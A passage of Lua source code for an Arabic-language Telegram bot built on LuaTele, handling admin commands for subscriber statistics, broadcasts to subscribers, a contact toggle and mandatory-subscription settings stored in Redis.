LuaTele.sendText(data.chat_id,data.id,'※ تم تفعيل التواصل ',"md",true)  
end
if text == "تعطيل التواصل" then
Redis:del(black.."TwaslBot")
LuaTele.sendText(data.chat_id,data.id,'※ تم تعطيل التواصل ',"md",true)  
end
if text == "الاحصائيات" then
Num_Members = Redis:smembers(black.."member:")
LuaTele.sendText(data.chat_id,data.id,"※ عدد المشتركين : "..#Num_Members,"html",true)  
end
if text == "اذاعه" then
Redis:setex(black.."Broadcasting:Users" .. data.chat_id .. ":" .. data.sender.user_id, 600, true) 
LuaTele.sendText(data.chat_id,data.id,[[
↯︙ارسل لي سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↯︙للخروج ارسل ( الغاء )
 ✓
]],"md",true)  
end
if text == "del" then
Redis:del(black.."data")
LuaTele.sendText(data.chat_id,data.id,"done","html",true)  
end
if text == "اذاعه بالتوجيه" then
Redis:setex(black.."Broadcasting:Users:Fwd" .. data.chat_id .. ":" .. data.sender.user_id, 600, true) 
LuaTele.sendText(data.chat_id,data.id,"※ ارسل لي التوجيه الان\n※ليتم نشره الى المشتركين","md",true)  
return false
end


end
end
if data and data.luatele and data.luatele == "updateNewCallbackQuery" then
Text = LuaTele.base64_decode(data.payload.data)
IdUser = data.sender_user_id
ChatId = data.chat_id
data.id = data.message_id
if Text and Text:match('(%d+)/setallmember') then
local UserId = Text:match('(%d+)/setallmember')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'عوده', data = IdUser..'/chback'},
},
{
{text = 'source black', url = 't.me/YDDCJ'}, 
},
}
}
local TextHelp = [[*
※ تم تفعيل وضع الاشتراك الاجباري لكل الاعضاء
*]]
Redis:set(black.."chmembers","on")
LuaTele.editMessageText(ChatId,data.id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/setforcmd') then
local UserId = Text:match('(%d+)/setforcmd')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'عوده', data = IdUser..'/chback'},
},
{
{text = 'source black', url = 't.me/YDDCJ'}, 
},
}
}
local TextHelp = [[*
※ تم تفعيل وضع الاشتراك الاجباري علي اوامر البوت فقط مثل (الحظر/الكتم الخ..)
*]]
Redis:del(black.."chmembers")
LuaTele.editMessageText(ChatId,data.id,TextHelp, 'md', true, false, reply_markup)
end
end


end






end
luatele.run(Run)
